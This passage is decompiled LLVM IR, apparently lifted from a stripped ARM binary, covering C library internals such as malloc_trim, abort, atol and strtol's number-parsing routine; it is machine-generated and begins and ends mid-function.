  store i32 %v0_12eb8, i32* %r0.global-to-local, align 4
  %v0_12ebc.pre = load i32, i32* @r1, align 4
  %v1_12ebc.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_12ebc

dec_label_pc_12ebc:                               ; preds = %dec_label_pc_12eac, %dec_label_pc_12eb8
  %v1_12ebc = phi i32 [ %v3_12ea4, %dec_label_pc_12eac ], [ %v1_12ebc.pre, %dec_label_pc_12eb8 ]
  %v0_12ebc = phi i32 [ %v3_12e98, %dec_label_pc_12eac ], [ %v0_12ebc.pre, %dec_label_pc_12eb8 ]
  %v2_12ebc = add i32 %v1_12ebc, 8
  %v3_12ebc = inttoptr i32 %v2_12ebc to i32*
  store i32 %v0_12ebc, i32* %v3_12ebc, align 4
  %v0_12ec0 = load i32, i32* %r2.global-to-local, align 4
  %v1_12ec0 = load i32, i32* %r1.global-to-local, align 4
  %v2_12ec0 = add i32 %v1_12ec0, 12
  %v3_12ec0 = inttoptr i32 %v2_12ec0 to i32*
  store i32 %v0_12ec0, i32* %v3_12ec0, align 4
  %v0_12ec4 = load i32, i32* %ip.global-to-local, align 4
  %v1_12ec4 = load i32, i32* %r0.global-to-local, align 4
  %v2_12ec4 = add i32 %v1_12ec4, %v0_12ec4
  store i32 %v2_12ec4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12ec8

dec_label_pc_12ec8:                               ; preds = %dec_label_pc_12e84.dec_label_pc_12ec8_crit_edge, %dec_label_pc_12ebc
  %v0_12ed8 = phi i32 [ %v0_12ed8.pre, %dec_label_pc_12e84.dec_label_pc_12ec8_crit_edge ], [ %v2_12ec4, %dec_label_pc_12ebc ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_12ecc = load i32, i32* @r7, align 4
  %v2_12ecc = add i32 %v0_12ecc, 64
  %v3_12ecc = inttoptr i32 %v2_12ecc to i32*
  %v4_12ecc = load i32, i32* %v3_12ecc, align 4
  %v1_12ed0 = add i32 %v4_12ecc, 52
  store i32 %v1_12ed0, i32* %r3.global-to-local, align 4
  %v1_12ed4 = add i32 %v4_12ecc, 60
  %v2_12ed4 = inttoptr i32 %v1_12ed4 to i32*
  %v3_12ed4 = load i32, i32* %v2_12ed4, align 4
  store i32 %v3_12ed4, i32* %r1.global-to-local, align 4
  %v1_12ed8 = or i32 %v0_12ed8, 1
  store i32 %v1_12ed8, i32* %r2.global-to-local, align 4
  %v1_12edc = load i32, i32* %r4.global-to-local, align 4
  %v2_12edc = add i32 %v1_12edc, 12
  %v3_12edc = inttoptr i32 %v2_12edc to i32*
  store i32 %v1_12ed0, i32* %v3_12edc, align 4
  %v0_12ee0 = load i32, i32* %r1.global-to-local, align 4
  %v1_12ee0 = load i32, i32* %r4.global-to-local, align 4
  %v2_12ee0 = add i32 %v1_12ee0, 8
  %v3_12ee0 = inttoptr i32 %v2_12ee0 to i32*
  store i32 %v0_12ee0, i32* %v3_12ee0, align 4
  %v0_12ee4 = load i32, i32* %r2.global-to-local, align 4
  %v1_12ee4 = load i32, i32* %r4.global-to-local, align 4
  %v2_12ee4 = add i32 %v1_12ee4, 4
  %v3_12ee4 = inttoptr i32 %v2_12ee4 to i32*
  store i32 %v0_12ee4, i32* %v3_12ee4, align 4
  %v0_12ee8 = load i32, i32* %ip.global-to-local, align 4
  %v1_12ee8 = load i32, i32* %r4.global-to-local, align 4
  %v3_12ee8 = add i32 %v1_12ee8, %v0_12ee8
  %v4_12ee8 = inttoptr i32 %v3_12ee8 to i32*
  store i32 %v0_12ee8, i32* %v4_12ee8, align 4
  %v0_12eec = load i32, i32* %r4.global-to-local, align 4
  %v1_12eec = load i32, i32* %r1.global-to-local, align 4
  %v2_12eec = add i32 %v1_12eec, 12
  %v3_12eec = inttoptr i32 %v2_12eec to i32*
  store i32 %v0_12eec, i32* %v3_12eec, align 4
  %v0_12ef0 = load i32, i32* %r4.global-to-local, align 4
  %v1_12ef0 = load i32, i32* %r3.global-to-local, align 4
  %v2_12ef0 = add i32 %v1_12ef0, 8
  %v3_12ef0 = inttoptr i32 %v2_12ef0 to i32*
  store i32 %v0_12ef0, i32* %v3_12ef0, align 4
  br label %dec_label_pc_12f08

dec_label_pc_12ef8:                               ; preds = %dec_label_pc_12e6c
  %v2_12ef8 = add i32 %v1_12e7c, %v0_12ef8
  store i32 %v2_12ef8, i32* %ip.global-to-local, align 4
  %v1_12efc = or i32 %v2_12ef8, 1
  store i32 %v1_12efc, i32* %r3.global-to-local, align 4
  %v0_12f00 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12f00, i32* %v2_12e74, align 4
  %v0_12f04 = load i32, i32* %r3.global-to-local, align 4
  %v1_12f04 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f04 = add i32 %v1_12f04, 4
  %v3_12f04 = inttoptr i32 %v2_12f04 to i32*
  store i32 %v0_12f04, i32* %v3_12f04, align 4
  br label %dec_label_pc_12f08

dec_label_pc_12f08:                               ; preds = %dec_label_pc_12ec8, %dec_label_pc_12ef8
  %v0_12f08 = load i32, i32* %ip.global-to-local, align 4
  %v3_12f0c = icmp ult i32 %v0_12f08, 131070
  br i1 %v3_12f0c, label %dec_label_pc_12f78, label %dec_label_pc_12f10

dec_label_pc_12f10:                               ; preds = %dec_label_pc_12f08
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_12f14 = load i32, i32* @r7, align 4
  %v2_12f14 = add i32 %v0_12f14, 64
  %v3_12f14 = inttoptr i32 %v2_12f14 to i32*
  %v4_12f14 = load i32, i32* %v3_12f14, align 4
  store i32 %v4_12f14, i32* @r4, align 4
  %v1_12f18 = inttoptr i32 %v4_12f14 to i32*
  %v2_12f18 = load i32, i32* %v1_12f18, align 4
  store i32 %v2_12f18, i32* %r3.global-to-local, align 4
  %v1_12f1c = and i32 %v2_12f18, 2
  %v2_12f1c = icmp eq i32 %v1_12f1c, 0
  br i1 %v2_12f1c, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_12f10
  store i32 %v4_12f14, i32* %r0.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_12f10, %bb
  %v1_12f24 = xor i1 %v2_12f1c, true
  call void @__pseudo_cond_branch(i1 %v1_12f24, i32 ptrtoint (i32* @global_var_12bc8.468 to i32))
  %v0_12f28 = load i32, i32* @r4, align 4
  %v1_12f28 = add i32 %v0_12f28, 44
  %v2_12f28 = inttoptr i32 %v1_12f28 to i32*
  %v3_12f28 = load i32, i32* %v2_12f28, align 4
  store i32 %v3_12f28, i32* %r3.global-to-local, align 4
  %v1_12f2c = add i32 %v3_12f28, 4
  %v2_12f2c = inttoptr i32 %v1_12f2c to i32*
  %v3_12f2c = load i32, i32* %v2_12f2c, align 4
  store i32 %v3_12f2c, i32* %r3.global-to-local, align 4
  %v1_12f30 = add i32 %v0_12f28, 836
  %v2_12f30 = inttoptr i32 %v1_12f30 to i32*
  %v3_12f30 = load i32, i32* %v2_12f30, align 4
  store i32 %v3_12f30, i32* %r2.global-to-local, align 4
  %v1_12f34 = and i32 %v3_12f2c, -4
  store i32 %v1_12f34, i32* %r3.global-to-local, align 4
  %v3_12f38 = icmp ult i32 %v1_12f34, %v3_12f30
  br i1 %v3_12f38, label %dec_label_pc_12f78, label %dec_label_pc_12f40

dec_label_pc_12f40:                               ; preds = %bb16
  store i32 %v0_12f28, i32* %r1.global-to-local, align 4
  %v1_12f44 = add i32 %v0_12f28, 840
  %v2_12f44 = inttoptr i32 %v1_12f44 to i32*
  %v3_12f44 = load i32, i32* %v2_12f44, align 4
  store i32 %v3_12f44, i32* %r0.global-to-local, align 4
  %v2_12f48 = call i32 @__malloc_trim(i32 %v3_12f44, i32 %v0_12f28)
  store i32 %v2_12f48, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12f78

dec_label_pc_12f50:                               ; preds = %dec_label_pc_12e14
  %v2_12f50 = inttoptr i32 %v1_12de4 to i32*
  %v3_12f50 = load i32, i32* %v2_12f50, align 4
  store i32 %v3_12f50, i32* %r0.global-to-local, align 4
  %v1_12f54 = add i32 %v4_12dd4, 848
  %v2_12f54 = inttoptr i32 %v1_12f54 to i32*
  %v3_12f54 = load i32, i32* %v2_12f54, align 4
  store i32 %v3_12f54, i32* %r2.global-to-local, align 4
  %v1_12f58 = add i32 %v4_12dd4, 868
  %v2_12f58 = inttoptr i32 %v1_12f58 to i32*
  %v3_12f58 = load i32, i32* %v2_12f58, align 4
  %v2_12f5c = add i32 %v3_12f50, %v1_12de0
  store i32 %v2_12f5c, i32* %r1.global-to-local, align 4
  %v1_12f60 = add i32 %v3_12f54, -1
  store i32 %v1_12f60, i32* %r2.global-to-local, align 4
  %v2_12f64 = sub i32 %v3_12f58, %v2_12f5c
  store i32 %v2_12f64, i32* %r3.global-to-local, align 4
  store i32 %v2_12f64, i32* %v2_12f58, align 4
  %v1_12f6c = load i32, i32* @lr, align 4
  %v2_12f6c = add i32 %v1_12f6c, 848
  %v3_12f6c = inttoptr i32 %v2_12f6c to i32*
  store i32 %v1_12f60, i32* %v3_12f6c, align 4
  %v0_12f70 = load i32, i32* %r0.global-to-local, align 4
  %v1_12f70 = load i32, i32* @r5, align 4
  %v2_12f70 = sub i32 %v1_12f70, %v0_12f70
  store i32 %v2_12f70, i32* %r0.global-to-local, align 4
  %v4_12f74 = call i32 @munmap(i32 %v2_12f70, i32 %v2_12f5c, i32 %v1_12f60, i32 %v2_12f64)
  store i32 %v4_12f74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12f78

dec_label_pc_12f78:                               ; preds = %bb16, %dec_label_pc_12f08, %dec_label_pc_12f40, %dec_label_pc_12df4, %dec_label_pc_12f50
  store i32 %v2_12d88, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_12f84 = load i32, i32* @r7, align 4
  %v2_12f84 = add i32 %v0_12f84, 44
  %v3_12f84 = inttoptr i32 %v2_12f84 to i32*
  %v4_12f84 = load i32, i32* %v3_12f84, align 4
  store i32 %v4_12f84, i32* %ip.global-to-local, align 4
  store i32 77712, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12f84)
  br label %dec_label_pc_12f90

dec_label_pc_12f90:                               ; preds = %entry, %dec_label_pc_12f78
  store i32 %v3_12d7c, i32* @r4, align 4
  store i32 %v6_12d7c, i32* @r5, align 4
  store i32 %v9_12d7c, i32* @r6, align 4
  store i32 %v12_12d7c, i32* @r7, align 4
  store i32 %v18_12d7c, i32* @lr, align 4
  ret i32 %v2_12d88

; uselistorder directives
  uselistorder i32 %v0_12f28, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_12ee8, { 1, 0 }
  uselistorder i32 %v1_12e28, { 1, 0 }
  uselistorder i32 %v0_12e28, { 1, 0 }
  uselistorder i32 %v3_12dfc, { 1, 0 }
  uselistorder i32 %v1_12de0, { 1, 0, 2 }
  uselistorder i32 %v2_12ddc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12dd4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12d84, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 0, 5, 1, 6, 2, 7, 4, 3, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 68) to i32*), { 0, 2, 3, 4, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 108) to i32*), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_12f90, { 1, 0 }
  uselistorder label %dec_label_pc_12f78, { 4, 2, 0, 1, 3 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_12f08, { 1, 0 }
  uselistorder label %dec_label_pc_12ec8, { 1, 0 }
  uselistorder label %dec_label_pc_12ebc, { 1, 0 }
  uselistorder label %dec_label_pc_12eb8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12e6c, { 1, 0 }
}

define i32 @function_12fa0(i32 %arg1) local_unnamed_addr {
dec_label_pc_12fa0:
  %v0_12fa0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12fa0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_12fa0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_12fa0, %bb
  %v4_12fb4 = phi i32 [ %arg1, %dec_label_pc_12fa0 ], [ 0, %bb ]
  ret i32 %v4_12fb4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_12fb8 = load i32, i32* @r4, align 4
  store i32 %v3_12fb8, i32* %stack_var_-12, align 4
  %v6_12fb8 = load i32, i32* @r5, align 4
  %v4_12fc8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 64) to i32*), align 4
  store i32 %v4_12fc8, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_12fc8, i32* @r0, align 4
  %v0_12fd8 = call i32 @__malloc_consolidate()
  %v0_12fdc = load i32, i32* @r4, align 4
  %v0_12fe0 = load i32, i32* @r5, align 4
  %v2_12fe8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12fe8, i32* @r4, align 4
  store i32 %v6_12fb8, i32* @r5, align 4
  %v2_12fec = call i32 @__malloc_trim(i32 %v0_12fdc, i32 %v0_12fe0)
  %v0_12ff0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12ff0, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_12ff4 = phi i32 [ %v2_12fec, %entry ], [ 0, %bb ]
  ret i32 %v4_12ff4

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 64) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* @r5, align 4
  %v4_13010 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 16) to i32*), align 4
  store i32 77852, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13010)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_13038 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_13040 = load i32, i32* @r5, align 4
  %v2_13040 = add i32 %v0_13040, 632
  %v3_13040 = inttoptr i32 %v2_13040 to i32*
  %v4_13040 = load i32, i32* %v3_13040, align 4
  %v2_13044 = icmp eq i32 %v4_13040, 0
  br i1 %v2_13044, label %dec_label_pc_1304c, label %dec_label_pc_1308c

dec_label_pc_1304c:                               ; preds = %entry
  store i32 1, i32* %v3_13040, align 4
  br label %dec_label_pc_13054

dec_label_pc_13054:                               ; preds = %dec_label_pc_1309c, %dec_label_pc_1304c
  %v0_13058 = load i32, i32* @r5, align 4
  %v2_13058 = add i32 %v0_13058, 212
  store i32 %v2_13058, i32* @r4, align 4
  %v2_13064 = add i32 %v0_13058, 68
  %v3_13064 = inttoptr i32 %v2_13064 to i32*
  %v4_13064 = load i32, i32* %v3_13064, align 4
  call void @__pseudo_branch(i32 %v4_13064)
  %v1_13074 = call i32 @__GI_raise(i32 6)
  %v0_13080 = load i32, i32* @r5, align 4
  %v2_13080 = add i32 %v0_13080, 16
  %v3_13080 = inttoptr i32 %v2_13080 to i32*
  %v4_13080 = load i32, i32* %v3_13080, align 4
  store i32 77964, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13080)
  %v0_13090.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1308c

dec_label_pc_1308c:                               ; preds = %entry, %dec_label_pc_13054
  %v1_130a4 = phi i32 [ %v0_13040, %entry ], [ %v0_13090.pre, %dec_label_pc_13054 ]
  %v2_13090 = add i32 %v1_130a4, 632
  %v3_13090 = inttoptr i32 %v2_13090 to i32*
  %v4_13090 = load i32, i32* %v3_13090, align 4
  %v7_13094 = icmp eq i32 %v4_13090, 1
  br i1 %v7_13094, label %dec_label_pc_1309c, label %dec_label_pc_130d8

dec_label_pc_1309c:                               ; preds = %dec_label_pc_1308c
  %v2_1309c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1309c, i32* @r4, align 4
  store i32 2, i32* %v3_13090, align 4
  %v3_130b4 = bitcast i32* %stack_var_-28 to i8*
  %v4_130b4 = call i32 @__GI_memset(i8* %v3_130b4, i32 0, i32 20)
  %v3_130d0 = call i32 @__libc_sigaction(i32 6, i32 %v2_1309c, i32 0)
  br label %dec_label_pc_13054

dec_label_pc_130d8:                               ; preds = %dec_label_pc_1308c
  %v7_130d8 = icmp eq i32 %v4_13090, 2
  br i1 %v7_130d8, label %dec_label_pc_130e0, label %dec_label_pc_130ec

dec_label_pc_130e0:                               ; preds = %dec_label_pc_130d8
  store i32 3, i32* %v3_13090, align 4
  %v0_130e8 = call i32 @abort()
  %v0_130ec.pre = load i32, i32* @r5, align 4
  %v1_130ec.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_130ec

dec_label_pc_130ec:                               ; preds = %dec_label_pc_130d8, %dec_label_pc_130e0
  %v3_130f8 = phi i32 [ 632, %dec_label_pc_130d8 ], [ %v1_130ec.pre, %dec_label_pc_130e0 ]
  %v2_130f8 = phi i32 [ %v1_130a4, %dec_label_pc_130d8 ], [ %v0_130ec.pre, %dec_label_pc_130e0 ]
  %v2_130ec = add i32 %v2_130f8, %v3_130f8
  %v3_130ec = inttoptr i32 %v2_130ec to i32*
  %v4_130ec = load i32, i32* %v3_130ec, align 4
  %v7_130f0 = icmp eq i32 %v4_130ec, 3
  br i1 %v7_130f0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_130ec
  store i32 4, i32* %v3_130ec, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_130ec, %bb
  call void @__pseudo_cond_branch(i1 %v7_130f0, i32 ptrtoint (i32* @global_var_14cd0.477 to i32))
  br label %dec_label_pc_13104

dec_label_pc_13104:                               ; preds = %dec_label_pc_13104, %.thread2
  %v0_13104 = call i32 @abort()
  br label %dec_label_pc_13104

; uselistorder directives
  uselistorder i32* %v3_13090, { 1, 0, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_130ec, { 1, 0 }
  uselistorder label %dec_label_pc_1308c, { 1, 0 }
}

define i32 @function_13110(i64* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13110:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_13110 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13110, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13110
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13110, %bb
  %v4_1311c = phi i32 [ %tmp, %dec_label_pc_13110 ], [ 0, %bb ]
  ret i32 %v4_1311c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_13130 = call i32 @strtol()
  ret i32 %v0_13130
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_1314c = call i32 @_stdlib_strto_l()
  ret i32 %v0_1314c
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %ip.global-to-local, align 4
  %v0_13170 = load i32, i32* @r1, align 4
  store i32 %v0_13170, i32* %sb.global-to-local, align 4
  %v0_13174 = load i32, i32* @r2, align 4
  store i32 %v0_13174, i32* %r5.global-to-local, align 4
  %v0_13178 = load i32, i32* @r0, align 4
  store i32 %v0_13178, i32* %r4.global-to-local, align 4
  %v0_1317c = load i32, i32* @r3, align 4
  br label %dec_label_pc_13188

dec_label_pc_13184:                               ; preds = %dec_label_pc_13188
  %v1_13184 = add i32 %v0_131c0, 1
  store i32 %v1_13184, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13188

dec_label_pc_13188:                               ; preds = %entry, %dec_label_pc_13184
  %v0_131c0 = phi i32 [ %v0_13178, %entry ], [ %v1_13184, %dec_label_pc_13184 ]
  %v1_13188 = inttoptr i32 %v0_131c0 to i8*
  %v2_13188 = load i8, i8* %v1_13188, align 1
  %v3_13188 = zext i8 %v2_13188 to i32
  store i32 %v3_13188, i32* %r1.global-to-local, align 4
  %v4_1318c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 276) to i32*), align 4
  %v2_13190 = mul nuw nsw i32 %v3_13188, 2
  %v2_13194 = add i32 %v2_13190, %v4_1318c
  %v3_13194 = inttoptr i32 %v2_13194 to i16*
  %v4_13194 = load i16, i16* %v3_13194, align 2
  %v1_13198 = and i16 %v4_13194, 32
  %v2_13198 = icmp eq i16 %v1_13198, 0
  br i1 %v2_13198, label %dec_label_pc_131a0, label %dec_label_pc_13184

dec_label_pc_131a0:                               ; preds = %dec_label_pc_13188
  %v7_131a0 = icmp eq i8 %v2_13188, 43
  br i1 %v7_131a0, label %dec_label_pc_131c0, label %dec_label_pc_131a8

dec_label_pc_131a8:                               ; preds = %dec_label_pc_131a0
  %v7_131a8 = icmp eq i8 %v2_13188, 45
  br i1 %v7_131a8, label %dec_label_pc_131c0, label %bb

bb:                                               ; preds = %dec_label_pc_131a8
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_131c4

dec_label_pc_131c0:                               ; preds = %dec_label_pc_131a0, %dec_label_pc_131a8
  %storemerge47 = phi i32 [ 1, %dec_label_pc_131a8 ], [ 0, %dec_label_pc_131a0 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_131c0 = add i32 %v0_131c0, 1
  store i32 %v1_131c0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_131c4

dec_label_pc_131c4:                               ; preds = %bb, %dec_label_pc_131c0
  %v0_131e4 = phi i32 [ %v0_131c0, %bb ], [ %v1_131c0, %dec_label_pc_131c0 ]
  %v1_131c4 = and i32 %v0_13174, -17
  %v3_131c4 = icmp eq i32 %v1_131c4, 0
  br i1 %v3_131c4, label %dec_label_pc_131d0, label %bb60

bb60:                                             ; preds = %dec_label_pc_131c4
  br label %bb64

dec_label_pc_131d0:                               ; preds = %dec_label_pc_131c4
  %v1_131d0 = inttoptr i32 %v0_131e4 to i8*
  %v2_131d0 = load i8, i8* %v1_131d0, align 1
  %v7_131d4 = icmp eq i8 %v2_131d0, 48
  %v1_131d8 = add i32 %v0_13174, 10
  store i32 %v1_131d8, i32* %r5.global-to-local, align 4
  br i1 %v7_131d4, label %dec_label_pc_131e4, label %bb61

bb61:                                             ; preds = %dec_label_pc_131d0
  br label %.thread8

dec_label_pc_131e4:                               ; preds = %dec_label_pc_131d0
  %v1_131e4 = add i32 %v0_131e4, 1
  %v2_131e4 = inttoptr i32 %v1_131e4 to i8*
  %v3_131e4 = load i8, i8* %v2_131e4, align 1
  %v4_131e4 = zext i8 %v3_131e4 to i32
  store i32 %v1_131e4, i32* %r4.global-to-local, align 4
  %v1_131e8 = or i32 %v4_131e4, 32
  %v7_131ec = icmp eq i32 %v1_131e8, 120
  %v1_131f0 = add i32 %v0_13174, 8
  store i32 %v1_131f0, i32* %r5.global-to-local, align 4
  br i1 %v7_131ec, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_131e4
  %v3_131fc = mul i32 %v1_131f0, 2
  store i32 %v3_131fc, i32* %r5.global-to-local, align 4
  %v2_13200 = add i32 %v0_131e4, 2
  store i32 %v2_13200, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_131e4, %bb61, %bb62
  %v1_132d430 = phi i32 [ %v0_13178, %bb61 ], [ %v1_131e4, %bb62 ], [ %v1_131e4, %dec_label_pc_131e4 ]
  %v0_1325021 = phi i32 [ %v0_131e4, %bb61 ], [ %v2_13200, %bb62 ], [ %v1_131e4, %dec_label_pc_131e4 ]
  %v0_13204 = phi i32 [ %v1_131d8, %bb61 ], [ %v3_131fc, %bb62 ], [ %v1_131f0, %dec_label_pc_131e4 ]
  %v5_13208 = icmp slt i32 %v0_13204, 16
  br i1 %v5_13208, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_132d429 = phi i32 [ %v0_13178, %bb60 ], [ %v1_132d430, %.thread8 ], [ %v1_132d430, %bb63 ]
  %v0_1325020 = phi i32 [ %v0_131e4, %bb60 ], [ %v0_1325021, %.thread8 ], [ %v0_1325021, %bb63 ]
  %v0_13230 = phi i32 [ %v0_13174, %bb60 ], [ %v0_13204, %.thread8 ], [ 16, %bb63 ]
  %v1_1320c = add i32 %v0_13230, -2
  %tmp = icmp ugt i32 %v1_1320c, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_1321c

.thread:                                          ; preds = %bb64
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_132d0

dec_label_pc_1321c:                               ; preds = %bb64
  %v2_13224 = udiv i32 -1, %v0_13230
  %v3_13224 = urem i32 -1, %v0_13230
  store i32 %v0_13230, i32* %r1.global-to-local, align 4
  %v1_13234 = urem i32 %v3_13224, 256
  store i32 %v1_13234, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i32 %v2_13224, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13250

dec_label_pc_1324c:                               ; preds = %bb71, %dec_label_pc_132ac
  %v0_1324c = phi i32 [ %v1_1328c44, %bb71 ], [ %v0_1324c.pre, %dec_label_pc_132ac ]
  br label %dec_label_pc_13250

dec_label_pc_13250:                               ; preds = %dec_label_pc_1321c, %dec_label_pc_1324c
  %v1_132d427 = phi i32 [ %v1_132d429, %dec_label_pc_1321c ], [ %v0_1324c, %dec_label_pc_1324c ]
  %v0_1328c = phi i32 [ %v0_1325020, %dec_label_pc_1321c ], [ %v0_1324c, %dec_label_pc_1324c ]
  %v1_13250 = inttoptr i32 %v0_1328c to i8*
  %v2_13250 = load i8, i8* %v1_13250, align 1
  %v3_13250 = zext i8 %v2_13250 to i32
  %v1_13254 = add nsw i32 %v3_13250, -48
  %v1_13258 = urem i32 %v1_13254, 256
  store i32 %v1_13258, i32* %r1.global-to-local, align 4
  %v1_13260 = or i32 %v3_13250, 32
  %tmp79 = icmp ult i32 %v1_13258, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_13268

dec_label_pc_13268:                               ; preds = %dec_label_pc_13250
  store i32 40, i32* %r1.global-to-local, align 4
  %tmp80 = icmp ugt i32 %v1_13260, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_13268
  %v1_1326c = add nsw i32 %v1_13260, -87
  %v5_13274 = urem i32 %v1_1326c, 256
  store i32 %v5_13274, i32* %r1.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_13250, %dec_label_pc_13268, %bb65
  %v3_132a4 = phi i32 [ %v1_13258, %dec_label_pc_13250 ], [ 40, %dec_label_pc_13268 ], [ %v5_13274, %bb65 ]
  %v1_13278 = load i32, i32* %r5.global-to-local, align 4
  %v6_1327c = icmp slt i32 %v3_132a4, %v1_13278
  br i1 %v6_1327c, label %dec_label_pc_13280, label %dec_label_pc_132d0.loopexit

dec_label_pc_13280:                               ; preds = %bb66
  %v0_13280 = load i32, i32* %ip.global-to-local, align 4
  %v1_13280 = load i32, i32* %r8.global-to-local, align 4
  %v9_13280 = icmp eq i32 %v0_13280, %v1_13280
  br i1 %v9_13280, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_13280
  %v1_1328c40 = add i32 %v0_1328c, 1
  store i32 %v1_1328c40, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13294

bb67:                                             ; preds = %dec_label_pc_13280
  %v3_13280 = icmp ult i32 %v0_13280, %v1_13280
  %v1_1328c = add i32 %v0_1328c, 1
